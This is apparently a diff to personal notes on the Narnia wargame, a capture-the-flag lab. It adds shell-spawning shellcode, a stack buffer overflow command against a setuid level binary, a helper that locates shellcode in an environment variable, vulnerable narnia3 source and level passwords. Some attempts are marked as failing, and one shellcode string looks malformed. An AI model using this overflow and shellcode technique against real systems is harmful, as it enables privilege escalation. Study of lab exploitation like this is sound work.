@@ -136,9 +136,92 @@ quit
 ./narnia2 $(perl -e 'print "a" x 107 . "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89e3\x52\x51\x53\x89\xe1\xcd\x80" . "\x90\xd8\xff\xff"')
 Segmentation fault (core dumped)
 
+cat getenvaddr.c
+
+-----------------------------------------------------------------------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc,char *argv[]){
+        char *ptr;
+        ptr=getenv(argv[1]);
+        ptr+=(strlen(argv[0])-strlen(argv[2]))*2;
+        printf("%s will be at %p\n",argv[1],ptr);
+        return 0;
+}
+
+-----------------------------------------------------------------------------------------
+
+narnia2@narnia:/tmp/aries$ export EGG=$(python -c 'print "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"')  
+narnia2@narnia:/tmp/aries$ touch getenvaddr.c                
+narnia2@narnia:/tmp/aries$ nano getenvaddr.c
+narnia2@narnia:/tmp/aries$ gcc getenvaddr.c -o getenvaddr -m32
+narnia2@narnia:/tmp/aries$ ./getenvaddr.c EGG /narnia/narnia2 
+0xffffd87e
+narnia2@narnia:/tmp/aries$ /narnia/narnia2 $(python -c 'print "U"*140 + "\x7e\xd8\xff\xff"')
+$ whoami
+narnia2
+# still not work...
+
+
+$$$$$$$$$$$$$$
+$$$ 333333 $$$
+$$$$$$$$$$$$$$
+
+cd ../../
+cd narnia
+cat narnia3.c
+
+-----------------------------------------------------------------------------------------
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h> 
+
+int main(int argc, char **argv){
+ 
+        int  ifd,  ofd;
+        char ofile[16] = "/dev/null";
+        char ifile[32];
+        char buf[32];
+ 
+        if(argc != 2){
+                printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
+                exit(-1);
+        }
+ 
+        /* open files */
+        strcpy(ifile, argv[1]);
+        if((ofd = open(ofile,O_RDWR)) < 0 ){
+                printf("error opening %s\n", ofile);
+                exit(-1);
+        }
+        if((ifd = open(ifile, O_RDONLY)) < 0 ){
+                printf("error opening %s\n", ifile);
+                exit(-1);
+        }
+ 
+        /* copy from file1 to file2 */
+        read(ifd, buf, sizeof(buf)-1);
+        write(ofd,buf, sizeof(buf)-1);
+        printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);
+ 
+        /* close 'em */
+        close(ifd);
+        close(ofd);
+ 
+        exit(1);
+}
 
 
 ** Passwords **
 narnia0:narnia0
 narnia1:efeidiedae
 narnia2:nairiepecu
+narnia3:vaequeezee
